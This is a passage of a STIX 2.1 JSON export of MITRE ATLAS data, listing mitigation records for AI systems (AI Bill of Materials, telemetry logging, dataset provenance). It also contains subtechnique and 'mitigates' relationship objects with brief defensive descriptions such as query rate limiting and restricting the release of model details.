model.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0022", "external_id": "AML.M0022"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--df1958aa-be55-468f-bd18-1e611b53e6a2", "created": "2025-08-12T19:58:34.767105Z", "modified": "2025-08-12T19:58:34.767105Z", "name": "AI Bill of Materials", "description": "An AI Bill of Materials (AI BOM) contains a full listing of artifacts and resources that were used in building the AI. The AI BOM can help mitigate supply chain risks and enable rapid response to reported vulnerabilities.\n\nThis can include maintaining dataset provenance, i.e. a detailed history of datasets used for AI applications. The history can include information about the dataset source as well as well as a complete record of any modifications.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0023", "external_id": "AML.M0023"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "created": "2025-08-12T19:58:34.767472Z", "modified": "2025-08-12T19:58:34.767472Z", "name": "AI Telemetry Logging", "description": "Implement logging of inputs and outputs of deployed AI models. Monitoring logs can help to detect security threats and mitigate impacts.\n\nAdditionally, having logging enabled can discourage adversaries who want to remain undetected from utilizing AI resources.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0024", "external_id": "AML.M0024"}]}, {"type": "course-of-action", "spec_version": "2.1", "id": "course-of-action--fb2f4bad-bf77-410c-9756-5afa7a5113fd", "created": "2025-08-12T19:58:34.768245Z", "modified": "2025-08-12T19:58:34.768245Z", "name": "Maintain AI Dataset Provenance", "description": "Maintain a detailed history of datasets used for AI applications. The history should include information about the dataset's source as well as a complete record of any modifications.", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org/mitigations/AML.M0025", "external_id": "AML.M0025"}]}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--3f3e25fb-48ff-44dd-8cac-f7c6025e8354", "created": "2025-08-12T19:58:34.744441Z", "modified": "2025-08-12T19:58:34.744441Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--eb9695c5-380a-43cc-b758-7004449f058d", "target_ref": "attack-pattern--3ac1b7da-0993-4e3f-a90f-710f0e901906"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--63ea6e63-f151-407e-8aa6-7e746729aa00", "created": "2025-08-12T19:58:34.744764Z", "modified": "2025-08-12T19:58:34.744764Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--1bccd478-edf1-4a20-bb05-8842e8ce48f5", "target_ref": "attack-pattern--3ac1b7da-0993-4e3f-a90f-710f0e901906"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--03bc50cb-b619-4142-b97e-5ccce7e2e45d", "created": "2025-08-12T19:58:34.744923Z", "modified": "2025-08-12T19:58:34.744923Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--d1e9dbb1-e5f8-4c40-86ca-f328b06a023f", "target_ref": "attack-pattern--3ac1b7da-0993-4e3f-a90f-710f0e901906"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--29a4d626-f922-47de-bb59-fef47cc5893d", "created": "2025-08-12T19:58:34.745542Z", "modified": "2025-08-12T19:58:34.745542Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--b98c5698-984d-49a4-9353-b62cdc27409b", "target_ref": "attack-pattern--762c1ab1-4885-4ac6-b167-f72135a54444"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--0be0f6b7-449d-451e-91ec-fd713f817829", "created": "2025-08-12T19:58:34.74569Z", "modified": "2025-08-12T19:58:34.74569Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--c2ac1f16-43b3-464b-bf64-f352c6986692", "target_ref": "attack-pattern--762c1ab1-4885-4ac6-b167-f72135a54444"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--6ac7cf79-615f-4212-a641-ccea6cc9169f", "created": "2025-08-12T19:58:34.745925Z", "modified": "2025-08-12T19:58:34.745925Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--d2d19d63-0d24-48be-bb96-cce753f05fab", "target_ref": "attack-pattern--d5288537-b502-445f-b5ce-41c625b39162"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--9c24a271-2600-4cb7-bd0d-d4edf96c53b4", "created": "2025-08-12T19:58:34.746071Z", "modified": "2025-08-12T19:58:34.746071Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--6c7b7972-39ae-4188-89ee-72dee4b9410d", "target_ref": "attack-pattern--d5288537-b502-445f-b5ce-41c625b39162"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b8949c5d-d345-4bc7-a94e-d2a9676e0b73", "created": "2025-08-12T19:58:34.746309Z", "modified": "2025-08-12T19:58:34.746309Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--3f0f88eb-8f24-4ae0-9049-2f8b892cf149", "target_ref": "attack-pattern--816a46e5-b654-4bc5-ab65-36f962ff2a15"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--eaef3fd7-9058-42e2-b0b6-c7ad36152423", "created": "2025-08-12T19:58:34.746546Z", "modified": "2025-08-12T19:58:34.746546Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--4a9ac079-addd-4dfa-98c3-73606d4e75e3", "target_ref": "attack-pattern--828ce387-26a1-4e8f-8f4e-9018748282c4"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--16e461eb-d31c-4c00-bef5-72614704bb5e", "created": "2025-08-12T19:58:34.746686Z", "modified": "2025-08-12T19:58:34.746686Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--3630cf80-5c1d-4179-99e8-95cb11d16a52", "target_ref": "attack-pattern--828ce387-26a1-4e8f-8f4e-9018748282c4"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--0df25358-53a1-4ac4-b583-844d55761564", "created": "2025-08-12T19:58:34.746997Z", "modified": "2025-08-12T19:58:34.746997Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--f0725321-e7a4-476c-aef3-ea72ec6d29b8", "target_ref": "attack-pattern--014b45cd-0f8f-447f-b92e-daeaaa03c6bd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--cf7f934a-1b78-47c8-a6ec-6472d1fae283", "created": "2025-08-12T19:58:34.747136Z", "modified": "2025-08-12T19:58:34.747136Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--8128388c-cca0-4c81-bbe5-d3421ac5d3df", "target_ref": "attack-pattern--014b45cd-0f8f-447f-b92e-daeaaa03c6bd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--9f02200d-d632-4386-893f-8a85b8cebaec", "created": "2025-08-12T19:58:34.747274Z", "modified": "2025-08-12T19:58:34.747274Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--13ecefc0-d955-42e5-8b6d-d3e3ff55a775", "target_ref": "attack-pattern--014b45cd-0f8f-447f-b92e-daeaaa03c6bd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5c2d0112-8a93-449b-862e-a2306c66fb03", "created": "2025-08-12T19:58:34.74741Z", "modified": "2025-08-12T19:58:34.74741Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--c63744cb-a84e-4ed1-93f4-efa757770e66", "target_ref": "attack-pattern--014b45cd-0f8f-447f-b92e-daeaaa03c6bd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--07ebf914-9470-43bb-af4a-b94c257c074f", "created": "2025-08-12T19:58:34.748334Z", "modified": "2025-08-12T19:58:34.748334Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--fe9d87d1-bb0a-4f57-9d69-9d2aacc19941", "target_ref": "attack-pattern--673c47c6-1620-4fd8-b49b-6d81a14d17cd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--285cbcb7-b489-41b1-a587-71e7fb26f791", "created": "2025-08-12T19:58:34.748476Z", "modified": "2025-08-12T19:58:34.748476Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--15798faf-f127-4af1-a39f-a2987b6893b4", "target_ref": "attack-pattern--673c47c6-1620-4fd8-b49b-6d81a14d17cd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--bb6f555b-1120-4a2d-b506-026a2a4c24be", "created": "2025-08-12T19:58:34.748617Z", "modified": "2025-08-12T19:58:34.748617Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--ff764f50-dce3-4bbd-83fb-7b0a0df20e88", "target_ref": "attack-pattern--673c47c6-1620-4fd8-b49b-6d81a14d17cd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--695355eb-6fed-4fe0-ac6c-34e32fdfb6c4", "created": "2025-08-12T19:58:34.748934Z", "modified": "2025-08-12T19:58:34.748934Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564", "target_ref": "attack-pattern--36e33591-e21d-43cd-aa32-a2ad2c9e8d1e"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--7b2d26c0-b0cd-4d08-acb7-61afc1bdcceb", "created": "2025-08-12T19:58:34.749373Z", "modified": "2025-08-12T19:58:34.749373Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--f4dfd872-4133-4dde-a901-433a9a0970a9", "target_ref": "attack-pattern--cf6f094e-1011-4643-91f3-487ac2803aaf"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b865b3a0-16f0-4936-8e3a-4a9c727c40f6", "created": "2025-08-12T19:58:34.749518Z", "modified": "2025-08-12T19:58:34.749518Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--a2de5e8e-2a0a-4d64-81cf-4370131e5922", "target_ref": "attack-pattern--cf6f094e-1011-4643-91f3-487ac2803aaf"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--01e12972-d3de-47ff-b92a-ec86d56fde58", "created": "2025-08-12T19:58:34.749752Z", "modified": "2025-08-12T19:58:34.749752Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--4a6b746e-98fc-4c70-9025-31ada433aca5", "target_ref": "attack-pattern--7a255ad9-ec2a-4520-bb72-fb407429eb2f"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--a47e91fc-d1ae-4ace-b9fd-1f880d1b94bd", "created": "2025-08-12T19:58:34.749891Z", "modified": "2025-08-12T19:58:34.749891Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--9e5d356e-592e-4cbf-9354-44f3fbd3a38a", "target_ref": "attack-pattern--7a255ad9-ec2a-4520-bb72-fb407429eb2f"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--3df2e6ca-e83c-4dae-ae6e-ce980e5f6a9a", "created": "2025-08-12T19:58:34.750027Z", "modified": "2025-08-12T19:58:34.750027Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--9f3f1f1e-e34a-4349-ae97-9c0fb1e4d426", "target_ref": "attack-pattern--7a255ad9-ec2a-4520-bb72-fb407429eb2f"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--95a70e5b-4bda-4731-8476-5487ca90859d", "created": "2025-08-12T19:58:34.751132Z", "modified": "2025-08-12T19:58:34.751132Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--5e379496-6393-41d5-b392-ba96edbe4f86", "target_ref": "attack-pattern--c8f02784-46a0-4d87-8836-bd0eaccbc4cb"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--35d85daa-6c84-4c88-a867-8a9b8efe467b", "created": "2025-08-12T19:58:34.751274Z", "modified": "2025-08-12T19:58:34.751274Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--cc16b8bf-0a76-4335-b3db-969399dac525", "target_ref": "attack-pattern--c8f02784-46a0-4d87-8836-bd0eaccbc4cb"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--1e25f273-d57a-46f8-8d36-9fc4ee538c77", "created": "2025-08-12T19:58:34.751415Z", "modified": "2025-08-12T19:58:34.751415Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--b6fceafb-8079-4f36-b4b7-54d62832a111", "target_ref": "attack-pattern--c8f02784-46a0-4d87-8836-bd0eaccbc4cb"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--56ddbf67-01e8-49a0-947c-a21dfebd862f", "created": "2025-08-12T19:58:34.751556Z", "modified": "2025-08-12T19:58:34.751556Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--c53ecb95-432c-4681-a6ca-971d2da001bc", "target_ref": "attack-pattern--c8f02784-46a0-4d87-8836-bd0eaccbc4cb"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b723b747-9eff-4762-8477-9b66c3d3bd63", "created": "2025-08-12T19:58:34.751696Z", "modified": "2025-08-12T19:58:34.751696Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--853ef456-d9ca-4383-9574-d2684ef4b231", "target_ref": "attack-pattern--c8f02784-46a0-4d87-8836-bd0eaccbc4cb"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--1f462c8a-140a-44a4-8123-1894edbf5097", "created": "2025-08-12T19:58:34.75206Z", "modified": "2025-08-12T19:58:34.75206Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--41642416-9252-4d86-9824-396bc0f1b1a9", "target_ref": "attack-pattern--2f84bcd7-4291-4978-bfbd-e801ae2c501e"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--769c0845-2c8b-45d0-8f5f-e1d4112e8bf0", "created": "2025-08-12T19:58:34.752219Z", "modified": "2025-08-12T19:58:34.752219Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--aecd0fff-8f6c-46ec-b8f0-6f4cbd7fdc5f", "target_ref": "attack-pattern--2f84bcd7-4291-4978-bfbd-e801ae2c501e"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--f60f8182-3a15-47f7-85b1-8f7551a0d9be", "created": "2025-08-12T19:58:34.752363Z", "modified": "2025-08-12T19:58:34.752363Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--f28e7e61-a369-405d-b816-cee59c2d1360", "target_ref": "attack-pattern--2f84bcd7-4291-4978-bfbd-e801ae2c501e"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--d9913161-71d2-46d4-96be-ad6a41290e37", "created": "2025-08-12T19:58:34.752502Z", "modified": "2025-08-12T19:58:34.752502Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--3bfb06ff-bb5f-4535-95c7-f8e026e6fced", "target_ref": "attack-pattern--2f84bcd7-4291-4978-bfbd-e801ae2c501e"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--892c29cd-5e85-486c-b768-10a58f77a1ce", "created": "2025-08-12T19:58:34.75264Z", "modified": "2025-08-12T19:58:34.75264Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--6849f610-5eb5-4b0d-9f88-82b2bbf3fd43", "target_ref": "attack-pattern--2f84bcd7-4291-4978-bfbd-e801ae2c501e"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--c4c91e4f-30a2-4f1d-bf02-5ce0231d4c90", "created": "2025-08-12T19:58:34.753038Z", "modified": "2025-08-12T19:58:34.753038Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--c9ba8911-fb11-43f0-a6d1-53140ff39d2e", "target_ref": "attack-pattern--e2ea36c0-8e3e-4604-8628-143213eb8276"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--a3bafb6b-c918-4686-842e-89e1c0338da4", "created": "2025-08-12T19:58:34.753174Z", "modified": "2025-08-12T19:58:34.753174Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--da54d2c9-a64b-4e9d-b3cd-bdd1fdc03a21", "target_ref": "attack-pattern--e2ea36c0-8e3e-4604-8628-143213eb8276"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--4d3c8abe-19ac-464b-bfb3-51f8c6c1ac13", "created": "2025-08-12T19:58:34.753398Z", "modified": "2025-08-12T19:58:34.753398Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--59aaa7f2-5a54-45cd-8de4-1896ec44566b", "target_ref": "attack-pattern--f17d0af8-5385-4eb4-a391-09017ac9783d"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5725a5d2-7d80-4eb0-9d3d-003105664618", "created": "2025-08-12T19:58:34.75415Z", "modified": "2025-08-12T19:58:34.75415Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--30fc8375-1772-43ca-a73a-0db501756852", "target_ref": "attack-pattern--86195060-a734-45e1-b616-ab224e31e8f3"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--0ff50cbe-2243-40d0-a60b-0b33b6da2066", "created": "2025-08-12T19:58:34.754547Z", "modified": "2025-08-12T19:58:34.754547Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--374f1fa9-3abc-4b58-8bc5-ceb10c3c0a2b", "target_ref": "attack-pattern--ab989163-432c-4466-aad8-4d0b0c4f2051"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--6d84a5d4-04c0-474a-b5bb-3ade104ae97f", "created": "2025-08-12T19:58:34.754685Z", "modified": "2025-08-12T19:58:34.754685Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--056a22ff-1355-44e0-8ee8-7139341188ab", "target_ref": "attack-pattern--ab989163-432c-4466-aad8-4d0b0c4f2051"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--d8d32d1e-a815-4cb8-bff7-170d46659782", "created": "2025-08-12T19:58:34.754916Z", "modified": "2025-08-12T19:58:34.754916Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--869faa3d-21e5-436b-8839-8ede09909285", "target_ref": "attack-pattern--222e7ac0-82fe-4570-a5cb-6794a2b93335"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--1d94cde6-d03d-4afd-959d-9b908b86555c", "created": "2025-08-12T19:58:34.755571Z", "modified": "2025-08-12T19:58:34.755571Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--02c6a7e0-475a-4752-bb53-c375700138c8", "target_ref": "attack-pattern--89a68366-0bd4-4344-b30b-2b859d2d1d54"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--7ac3b09f-fe0e-4289-9cd2-c7f3854a38f5", "created": "2025-08-12T19:58:34.755711Z", "modified": "2025-08-12T19:58:34.755711Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--ea86c03d-6509-4bcb-a0dc-61f02309dc4f", "target_ref": "attack-pattern--89a68366-0bd4-4344-b30b-2b859d2d1d54"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--db608832-42fe-4c54-871b-38177036ea8a", "created": "2025-08-12T19:58:34.755849Z", "modified": "2025-08-12T19:58:34.755849Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--8b85fd7f-77fe-46ab-8842-964a9cca4bd8", "target_ref": "attack-pattern--89a68366-0bd4-4344-b30b-2b859d2d1d54"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--af0d3110-b435-4444-8c3d-fa45d2f02b7c", "created": "2025-08-12T19:58:34.756161Z", "modified": "2025-08-12T19:58:34.756161Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--7173dc23-7ce1-4d38-a6fa-15f6aa8e76c4", "target_ref": "attack-pattern--18a1f52d-8e32-4e76-831d-f590c4b98196"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--426523ac-e6b9-4878-85b0-2534caae1068", "created": "2025-08-12T19:58:34.756297Z", "modified": "2025-08-12T19:58:34.756297Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--e0e50373-4d78-4630-860c-8188fc3eefcb", "target_ref": "attack-pattern--18a1f52d-8e32-4e76-831d-f590c4b98196"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--57de5ad6-2382-4a75-a725-d089a181a696", "created": "2025-08-12T19:58:34.756434Z", "modified": "2025-08-12T19:58:34.756434Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--47eecd80-97f8-4877-8f0d-549253f4e432", "target_ref": "attack-pattern--18a1f52d-8e32-4e76-831d-f590c4b98196"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--644a6da9-f98c-4941-8d72-65a3146c8efd", "created": "2025-08-12T19:58:34.75708Z", "modified": "2025-08-12T19:58:34.75708Z", "relationship_type": "subtechnique-of", "source_ref": "attack-pattern--b2954419-50fe-4919-b69d-cb6aca2e553e", "target_ref": "attack-pattern--5d35bff4-a8f5-453f-b3a1-2413336739ad"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--35b6e417-17c2-4d27-b410-beb62fc6e637", "created": "2025-08-12T19:58:34.758561Z", "modified": "2025-08-12T19:58:34.758561Z", "relationship_type": "mitigates", "description": "Limit the connection between publicly disclosed approaches and the data, models, and algorithms used in production.\n", "source_ref": "course-of-action--9c18d1cf-cf39-49e6-a60c-bd0cd34e381c", "target_ref": "attack-pattern--3ac1b7da-0993-4e3f-a90f-710f0e901906"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--8a18a227-cc19-4e29-a673-d51cd5f59b4c", "created": "2025-08-12T19:58:34.758633Z", "modified": "2025-08-12T19:58:34.758633Z", "relationship_type": "mitigates", "description": "Restrict release of technical information on ML-enabled products and organizational information on the teams supporting ML-enabled products.\n", "source_ref": "course-of-action--9c18d1cf-cf39-49e6-a60c-bd0cd34e381c", "target_ref": "attack-pattern--be091749-3b46-463f-9df2-3eddc05ca8c0"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--16725b88-33d1-4fe9-afd4-60f7aefcaa3b", "created": "2025-08-12T19:58:34.7587Z", "modified": "2025-08-12T19:58:34.7587Z", "relationship_type": "mitigates", "description": "Limit the release of sensitive information in the metadata of deployed systems and publicly available applications.\n", "source_ref": "course-of-action--9c18d1cf-cf39-49e6-a60c-bd0cd34e381c", "target_ref": "attack-pattern--762c1ab1-4885-4ac6-b167-f72135a54444"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--4b082a68-6633-47e8-aea0-9e4c8ddb5725", "created": "2025-08-12T19:58:34.758766Z", "modified": "2025-08-12T19:58:34.758766Z", "relationship_type": "mitigates", "description": "Limit the release of sensitive information in the metadata of deployed systems and publicly available applications.\n", "source_ref": "course-of-action--9c18d1cf-cf39-49e6-a60c-bd0cd34e381c", "target_ref": "attack-pattern--4ba93236-1f61-4405-b7f4-a8b6be4c0d97"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--d3fd1c61-22a3-41f9-ab9c-97f47a3bbf98", "created": "2025-08-12T19:58:34.758905Z", "modified": "2025-08-12T19:58:34.758905Z", "relationship_type": "mitigates", "description": "Limiting the release of datasets can reduce an adversary's ability to target production models trained on the same or similar data.\n", "source_ref": "course-of-action--d40b9028-ea1d-477b-95e4-b875ecefb72e", "target_ref": "attack-pattern--b98c5698-984d-49a4-9353-b62cdc27409b"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--8c3fc49e-6591-4eb0-9333-7df3b2627474", "created": "2025-08-12T19:58:34.75897Z", "modified": "2025-08-12T19:58:34.75897Z", "relationship_type": "mitigates", "description": "Limiting the release of model architectures and checkpoints can reduce an adversary's ability to target those models.\n", "source_ref": "course-of-action--d40b9028-ea1d-477b-95e4-b875ecefb72e", "target_ref": "attack-pattern--c2ac1f16-43b3-464b-bf64-f352c6986692"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--4c324a74-8156-47bd-aeb8-46816ca0042c", "created": "2025-08-12T19:58:34.759044Z", "modified": "2025-08-12T19:58:34.759044Z", "relationship_type": "mitigates", "description": "Published datasets can be a target for poisoning attacks.\n", "source_ref": "course-of-action--d40b9028-ea1d-477b-95e4-b875ecefb72e", "target_ref": "attack-pattern--85945825-054e-4581-b95c-767be68d1af9"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--193a1cad-cdf2-40df-802b-1898cb1d4059", "created": "2025-08-12T19:58:34.759193Z", "modified": "2025-08-12T19:58:34.759193Z", "relationship_type": "mitigates", "description": "Suggested approaches:\n  - Restrict the number of results shown\n  - Limit specificity of output class ontology\n  - Use randomized smoothing techniques\n  - Reduce the precision of numerical outputs\n", "source_ref": "course-of-action--517ba232-61b8-42f4-a609-ef487befcba6", "target_ref": "attack-pattern--d14c8181-1bb2-4c82-b5ea-daacee09aa16"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--d992816a-8316-45db-a92a-8de9b2dadb3e", "created": "2025-08-12T19:58:34.759264Z", "modified": "2025-08-12T19:58:34.759264Z", "relationship_type": "mitigates", "description": "Suggested approaches:\n  - Restrict the number of results shown\n  - Limit specificity of output class ontology\n  - Use randomized smoothing techniques\n  - Reduce the precision of numerical outputs\n", "source_ref": "course-of-action--517ba232-61b8-42f4-a609-ef487befcba6", "target_ref": "attack-pattern--7da2c306-0c7b-4ca4-80d0-8235cc6cd588"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--5c18ec3e-6e6b-45da-9e75-346e605d7106", "created": "2025-08-12T19:58:34.759343Z", "modified": "2025-08-12T19:58:34.759343Z", "relationship_type": "mitigates", "description": "Suggested approaches:\n  - Restrict the number of results shown\n  - Limit specificity of output class ontology\n  - Use randomized smoothing techniques\n  - Reduce the precision of numerical outputs\n", "source_ref": "course-of-action--517ba232-61b8-42f4-a609-ef487befcba6", "target_ref": "attack-pattern--cc16b8bf-0a76-4335-b3db-969399dac525"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--e2431e81-5229-438f-800b-23d127008a2e", "created": "2025-08-12T19:58:34.759416Z", "modified": "2025-08-12T19:58:34.759416Z", "relationship_type": "mitigates", "description": "Suggested approaches:\n  - Restrict the number of results shown\n  - Limit specificity of output class ontology\n  - Use randomized smoothing techniques\n  - Reduce the precision of numerical outputs\n", "source_ref": "course-of-action--517ba232-61b8-42f4-a609-ef487befcba6", "target_ref": "attack-pattern--4a6b746e-98fc-4c70-9025-31ada433aca5"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--2b757650-ad6b-4013-8bcb-7eb49184d0a4", "created": "2025-08-12T19:58:34.759558Z", "modified": "2025-08-12T19:58:34.759558Z", "relationship_type": "mitigates", "description": "Suggested approaches:\n  - Restrict the number of results shown\n  - Limit specificity of output class ontology\n  - Use randomized smoothing techniques\n  - Reduce the precision of numerical outputs\n", "source_ref": "course-of-action--517ba232-61b8-42f4-a609-ef487befcba6", "target_ref": "attack-pattern--9e5d356e-592e-4cbf-9354-44f3fbd3a38a"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--877e184c-c571-4fa7-83bd-2adb937a53bb", "created": "2025-08-12T19:58:34.759631Z", "modified": "2025-08-12T19:58:34.759631Z", "relationship_type": "mitigates", "description": "Suggested approaches:\n  - Restrict the number of results shown\n  - Limit specificity of output class ontology\n  - Use randomized smoothing techniques\n  - Reduce the precision of numerical outputs\n", "source_ref": "course-of-action--517ba232-61b8-42f4-a609-ef487befcba6", "target_ref": "attack-pattern--9f3f1f1e-e34a-4349-ae97-9c0fb1e4d426"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--deae2ebe-9d1e-4c52-830a-8a64429649e0", "created": "2025-08-12T19:58:34.759782Z", "modified": "2025-08-12T19:58:34.759782Z", "relationship_type": "mitigates", "description": "Hardened models are more difficult to evade.\n", "source_ref": "course-of-action--70fa8e8c-dd1f-480b-b077-49b3a8a368e4", "target_ref": "attack-pattern--617a8d41-f0fd-4b88-a6c2-66fa5ca45efd"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--54f41f54-0ad3-44b4-8dc4-c522d7462032", "created": "2025-08-12T19:58:34.759859Z", "modified": "2025-08-12T19:58:34.759859Z", "relationship_type": "mitigates", "description": "Hardened models are less susceptible to integrity attacks.\n", "source_ref": "course-of-action--70fa8e8c-dd1f-480b-b077-49b3a8a368e4", "target_ref": "attack-pattern--711f66ad-d72b-4037-87a6-614a7ff9e000"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--4783f487-3d81-4f39-8666-9ef0a209099b", "created": "2025-08-12T19:58:34.760011Z", "modified": "2025-08-12T19:58:34.760011Z", "relationship_type": "mitigates", "description": "Limit the number of queries users can perform in a given interval to hinder an attacker's ability to send computationally expensive inputs\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--56022f01-f3e9-442e-b1aa-8e2b50560d22"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b39cbb72-0942-4c63-a49f-86fca661096d", "created": "2025-08-12T19:58:34.76008Z", "modified": "2025-08-12T19:58:34.76008Z", "relationship_type": "mitigates", "description": "Limit the amount of information an attacker can learn about a model's ontology through API queries.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--d14c8181-1bb2-4c82-b5ea-daacee09aa16"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--03701ebd-6840-486b-840c-a00574abd30d", "created": "2025-08-12T19:58:34.760149Z", "modified": "2025-08-12T19:58:34.760149Z", "relationship_type": "mitigates", "description": "Limit the amount of information an attacker can learn about a model's ontology through API queries.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": "attack-pattern--7da2c306-0c7b-4ca4-80d0-8235cc6cd588"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--068f3773-ea8d-44dc-8966-d9d151904d7a", "created": "2025-08-12T19:58:34.76022Z", "modified": "2025-08-12T19:58:34.76022Z", "relationship_type": "mitigates", "description": "Limit the volume of API queries in a given period of time to regulate the amount and fidelity of potentially sensitive information an attacker can learn.\n", "source_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "target_ref": 